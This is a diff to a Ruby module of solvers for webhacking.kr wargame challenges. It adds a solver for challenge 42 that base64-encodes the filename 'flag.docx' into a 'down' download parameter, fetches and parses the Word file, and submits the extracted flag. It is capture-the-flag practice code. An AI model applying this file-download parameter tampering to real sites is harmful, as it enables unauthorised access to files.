@@ -3,6 +3,7 @@
 require 'digest'
 require 'base64'
 require 'resolv'
+require 'docx'
 
 module WebhackingKR
   ##
@@ -751,6 +752,32 @@ module WebhackingKR
       log('Getting admin page')
       response = get(PATH_ADMIN)
       check(response.body)
+    end
+  end
+
+  ##
+  # Challenge 42
+  class Challenge42 < ChallengeBase
+    CHALLENGE = 42
+
+    PATH = '/challenge/web-20/'
+    PARAM_DOWN = 'down'
+    FILE = 'flag.docx'
+
+    def exec
+      file = Base64.strict_encode64(FILE)
+      query = URI.encode_www_form(PARAM_DOWN => file)
+      log("Getting file #{FILE}")
+      response = get("#{PATH}?#{query}")
+      doc = Docx::Document.open(response.body)
+      match = /(FLAG\{.*\})/.match(doc.paragraphs[0].to_s)
+      unless match
+        failed
+        return
+      end
+
+      log(match[1])
+      check(auth(match[1]))
     end
   end
 
